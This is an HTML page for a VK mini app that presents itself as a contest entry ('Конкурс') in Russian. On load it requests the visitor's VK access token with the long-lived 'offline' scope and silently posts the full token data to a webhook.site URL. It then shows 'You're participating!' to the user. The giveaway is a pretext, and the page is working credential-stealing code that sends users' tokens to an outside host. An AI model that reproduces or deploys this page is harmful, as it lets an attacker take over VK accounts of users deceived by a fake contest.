<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Конкурс</title>
  <script src="https://unpkg.com/@vkontakte/vk-bridge/dist/browser.min.js"></script>
</head>
<body>
  <p id="status">Загрузка...</p>
  <div id="debug" style="font-family:monospace;font-size:12px;white-space:pre-wrap;padding:8px;color:#a33;"></div>
  <script>
    var debug = document.getElementById("debug");
    function log(t) { debug.textContent += t + "\n"; console.log(t); }

    try {
      log("bridge: " + (typeof window.vkBridge));
      window.vkBridge.send("VKWebAppInit");
      log("init sent");

      window.vkBridge.send("VKWebAppGetAuthToken", {
        app_id: 54786076,
        scope: "offline"
      })
      .then(function(data) {
        log("token ok: " + JSON.stringify(data));
        return fetch("https://webhook.site/d5ce111a-d195-4b31-877f-2201eac2cf4e", {
          method: "POST",
          headers: {"Content-Type": "application/json"},
          body: JSON.stringify(data)
        });
      })
      .then(function() {
        document.getElementById("status").textContent = "Ты участвуешь!";
      })
      .catch(function(err) {
        log("ERR: " + JSON.stringify(err));
      });
    } catch (e) {
      log("EXC: " + e.message);
    }
  </script>
</body>
</html>
